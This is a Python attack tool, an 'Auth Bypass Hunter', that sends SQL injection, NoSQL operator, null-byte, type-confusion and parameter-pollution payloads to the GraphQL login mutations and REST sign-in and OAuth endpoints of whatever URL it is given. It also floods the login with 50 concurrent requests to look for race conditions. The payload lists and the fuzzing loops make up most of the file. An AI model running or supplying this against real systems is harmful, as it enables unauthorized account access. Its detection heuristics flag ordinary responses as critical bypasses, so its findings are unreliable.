#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║              💀 AUTH BYPASS HUNTER - 0DAY DISCOVERY                  ║
║          Focus: Sanitization Bypass & Logic Flaws                    ║
╚══════════════════════════════════════════════════════════════════════╝

TARGETS:
- GraphQL authentication mutations
- Username/password sanitization functions
- JWT token validation logic
- Session management bypasses
- OAuth/OIDC flow manipulation

TECHNIQUES:
- Fuzzing sanitization with special chars
- Race conditions in auth flows
- Parameter pollution
- Type confusion attacks
- Logic flaw exploitation
"""

import requests
import json
import re
import time
from urllib.parse import urljoin, quote
from typing import List, Dict, Any
import sys


class AuthBypassHunter:
    """Hunt for authentication bypass vulnerabilities"""
    
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.findings = []
        
        # Sanitization bypass payloads
        self.payloads = {
            'sql_bypass': [
                "admin'--", "admin' OR '1'='1", "admin' OR 1=1--",
                "' OR '1'='1' --", "' OR 1=1#", "admin'/*",
                "') OR ('1'='1", "admin' UNION SELECT NULL--"
            ],
            'nosql_bypass': [
                '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
                '{"username":{"$ne":null},"password":{"$ne":null}}'
            ],
            'graphql_bypass': [
                'admin\\u0027', 'admin\\x27', 'admin\u0000',
                'admin\n', 'admin\r\n', 'admin\\n'
            ],
            'sanitization_bypass': [
                'admin\x00user', 'admin%00user', 'admin\u200badmin',
                'ADmin', 'AdMiN', 'aDmIn',  # Case manipulation
                'admin\t', 'admin\r', 'admin\n',  # Whitespace
                'admin..', 'admin/./', 'admin\\',  # Path traversal
                'admin<script>', 'admin&lt;', 'admin&#60;',  # XSS bypass
            ],
            'type_confusion': [
                '{"username":["admin"],"password":"test"}',  # Array
                '{"username":true,"password":true}',  # Boolean
                '{"username":1337,"password":1337}',  # Integer
                '{"username":null,"password":null}',  # Null
            ],
            'parameter_pollution': [
                'username=admin&username=attacker',
                'username[]=admin&password=test',
                'username=admin&password=test&password=evil',
            ]
        }
    
    def test_graphql_auth_mutations(self) -> List[Dict]:
        """Test GraphQL authentication mutations for bypasses"""
        print(f"[+] Testing GraphQL authentication mutations...")
        
        graphql_url = urljoin(self.target, '/api/graphql')
        
        # Introspection to find auth mutations
        introspection = """
        query {
          __schema {
            mutationType {
              fields {
                name
                args {
                  name
                  type { name kind ofType { name } }
                }
              }
            }
          }
        }
        """
        
        try:
            resp = self.session.post(
                graphql_url,
                json={'query': introspection},
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                mutations = data.get('data', {}).get('__schema', {}).get('mutationType', {}).get('fields', [])
                
                # Find auth-related mutations
                auth_mutations = [
                    m for m in mutations 
                    if any(kw in m['name'].lower() for kw in ['login', 'signin', 'auth', 'token'])
                ]
                
                print(f"[*] Found {len(auth_mutations)} auth mutations")
                
                # Test each mutation with bypass payloads
                for mutation in auth_mutations:
                    self.fuzz_mutation(graphql_url, mutation)
        
        except Exception as e:
            print(f"[-] GraphQL auth test failed: {e}")
        
        return self.findings
    
    def fuzz_mutation(self, url: str, mutation: Dict):
        """Fuzz a specific mutation with bypass payloads"""
        mutation_name = mutation['name']
        args = mutation.get('args', [])
        
        print(f"[*] Fuzzing mutation: {mutation_name}")
        
        # Build mutation template
        arg_names = [arg['name'] for arg in args]
        
        # Test with each payload category
        for category, payloads in self.payloads.items():
            for payload in payloads[:3]:  # Limit for speed
                
                # Build GraphQL mutation
                mutation_query = self.build_mutation(mutation_name, arg_names, payload)
                
                try:
                    resp = self.session.post(
                        url,
                        json={'query': mutation_query},
                        timeout=5
                    )
                    
                    # Check for bypass indicators
                    if self.is_bypass_successful(resp):
                        self.findings.append({
                            'title': f'Authentication Bypass in {mutation_name}',
                            'type': 'auth_bypass',
                            'category': category,
                            'payload': payload,
                            'mutation': mutation_name,
                            'response_code': resp.status_code,
                            'severity': 'critical',
                            'confidence': 'high',
                            'description': f'Mutation {mutation_name} accepts malicious payload: {payload}'
                        })
                        print(f"[!] BYPASS FOUND: {mutation_name} with {payload}")
                
                except Exception as e:
                    pass
    
    def build_mutation(self, name: str, args: List[str], payload: str) -> str:
        """Build GraphQL mutation with payload"""
        # Use payload for username-like fields
        arg_values = []
        for arg in args:
            if any(kw in arg.lower() for kw in ['user', 'login', 'email']):
                arg_values.append(f'{arg}: "{payload}"')
            else:
                arg_values.append(f'{arg}: "test123"')
        
        return f'mutation {{ {name}(input: {{{", ".join(arg_values)}}}) {{ success errors }} }}'
    
    def is_bypass_successful(self, resp: requests.Response) -> bool:
        """Detect if bypass was successful"""
        # Check response indicators
        if resp.status_code == 200:
            try:
                data = resp.json()
                
                # Check for success markers
                if 'data' in data and data['data']:
                    # No errors = potential bypass
                    errors = data.get('errors', [])
                    if not errors:
                        return True
                    
                    # Check if errors mention validation (not auth failure)
                    error_msgs = ' '.join([e.get('message', '') for e in errors]).lower()
                    if 'invalid' not in error_msgs and 'unauthorized' not in error_msgs:
                        return True
                
                # Check for tokens in response
                resp_text = json.dumps(data)
                if any(kw in resp_text for kw in ['token', 'jwt', 'session', 'authenticated']):
                    return True
            
            except:
                pass
        
        return False
    
    def test_sanitization_logic(self) -> List[Dict]:
        """Test input sanitization logic for bypasses"""
        print(f"[+] Testing input sanitization...")
        
        # Test REST endpoints
        for endpoint in ['/api/v4/session', '/users/sign_in', '/oauth/token']:
            url = urljoin(self.target, endpoint)
            
            for category, payloads in self.payloads.items():
                for payload in payloads[:2]:
                    
                    try:
                        # POST with payload
                        resp = self.session.post(
                            url,
                            json={'username': payload, 'password': 'test'},
                            timeout=5
                        )
                        
                        # Check if sanitization was bypassed
                        if self.detect_sanitization_bypass(resp, payload):
                            self.findings.append({
                                'title': f'Sanitization Bypass at {endpoint}',
                                'type': 'sanitization_bypass',
                                'category': category,
                                'payload': payload,
                                'endpoint': endpoint,
                                'severity': 'high',
                                'confidence': 'medium',
                                'description': f'Input sanitization can be bypassed with: {payload}'
                            })
                            print(f"[!] SANITIZATION BYPASS: {endpoint}")
                    
                    except:
                        pass
        
        return self.findings
    
    def detect_sanitization_bypass(self, resp: requests.Response, payload: str) -> bool:
        """Detect if sanitization was bypassed"""
        # Check if payload appears in response (reflected)
        if payload in resp.text:
            return True
        
        # Check for error messages indicating validation bypass
        error_indicators = [
            'sql', 'injection', 'script', 'invalid',
            'malformed', 'syntax error'
        ]
        
        resp_lower = resp.text.lower()
        if any(ind in resp_lower for ind in error_indicators):
            return True
        
        return False
    
    def test_race_conditions(self) -> List[Dict]:
        """Test for race conditions in auth logic"""
        print(f"[+] Testing race conditions...")
        
        import concurrent.futures
        
        graphql_url = urljoin(self.target, '/api/graphql')
        
        # Mutation to test
        mutation = 'mutation { userLogin(input: {username: "admin", password: "test"}) { token } }'
        
        def send_request():
            try:
                return self.session.post(
                    graphql_url,
                    json={'query': mutation},
                    timeout=3
                )
            except:
                return None
        
        # Send 50 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(send_request) for _ in range(50)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        # Analyze results for race condition
        success_count = sum(1 for r in results if r and r.status_code == 200)
        
        if success_count > 5:  # More than 5 successful = potential race condition
            self.findings.append({
                'title': 'Race Condition in Authentication',
                'type': 'race_condition',
                'severity': 'high',
                'confidence': 'medium',
                'description': f'{success_count}/50 requests succeeded - potential race condition',
                'success_rate': f'{success_count}/50'
            })
            print(f"[!] RACE CONDITION DETECTED: {success_count}/50 succeeded")
        
        return self.findings
    
    def hunt(self) -> List[Dict]:
        """Main hunting routine"""
        print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║           💀 AUTH BYPASS HUNTER - Starting Hunt                      ║
║           Target: {self.target:50s} ║
╚══════════════════════════════════════════════════════════════════════╝
        """)
        
        # Run all tests
        self.test_graphql_auth_mutations()
        self.test_sanitization_logic()
        self.test_race_conditions()
        
        # Summary
        print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║                         HUNT RESULTS                                 ║
╠══════════════════════════════════════════════════════════════════════╣
  Total Findings:     {len(self.findings)}
  Critical:           {sum(1 for f in self.findings if f.get('severity') == 'critical')}
  High:               {sum(1 for f in self.findings if f.get('severity') == 'high')}
  Medium:             {sum(1 for f in self.findings if f.get('severity') == 'medium')}
╚══════════════════════════════════════════════════════════════════════╝
        """)
        
        # Save findings
        output_file = f"/tmp/auth_bypass_{int(time.time())}.json"
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=2)
        
        print(f"[+] Findings saved to: {output_file}")
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: auth_bypass_hunter.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    hunter = AuthBypassHunter(target)
    findings = hunter.hunt()
    
    # Print findings
    for f in findings:
        print(f"\n[!] {f['title']}")
        print(f"    Severity: {f.get('severity', 'unknown')}")
        print(f"    Payload: {f.get('payload', 'N/A')}")


if __name__ == '__main__':
    main()
